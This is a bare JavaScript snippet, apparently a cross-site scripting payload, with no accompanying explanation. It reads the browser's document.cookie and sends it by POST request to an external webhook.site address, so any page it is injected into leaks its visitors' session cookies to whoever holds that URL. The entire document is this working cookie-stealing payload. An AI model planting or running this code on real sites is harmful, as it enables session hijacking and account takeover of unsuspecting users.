fetch("https://webhook.site/fd7170b8-0d43-443b-b69b-8e82434324e7", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
        cookie: document.cookie
    })
});
